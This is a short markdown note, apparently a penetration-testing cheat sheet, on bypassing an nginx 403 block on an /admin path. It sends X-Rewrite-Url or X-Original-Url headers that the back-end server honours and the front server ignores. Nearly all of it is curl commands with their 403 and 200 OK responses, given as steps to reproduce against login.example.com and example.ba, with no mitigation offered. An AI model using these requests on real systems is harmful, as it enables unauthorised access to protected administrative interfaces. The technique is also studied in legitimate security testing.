---
title: "Bypass 403 on nginx"
---

Normally a client can't access `/admin` directory because of front nginx server which returns 403 Forbidden. We can:

    * use `X-Rewrite-Url` or `X-original-url` 
    * back server processes these headers and front server doesn't.

Steps to reproduce:

**normally** 

``` 
$ curl -i -s -k -X $'GET' -H $'Host: login.example.com' $'https://login.example.com/admin/login'
403 Forbidden
...
```

**bypass (1)**

```
$ curl -i -s -k -X $'GET' -H $'Host: login.example.com' -H $'X-rewrite-url: admin/login' $'https://login.example.com/'
200 OK
```

**bypass (2)**

```
$ curl -i -s -k -X $'GET' -H $'Host: example.ba' -H $'X-rewrite-url: admin' $'https://example.ba/'
200 OK
```

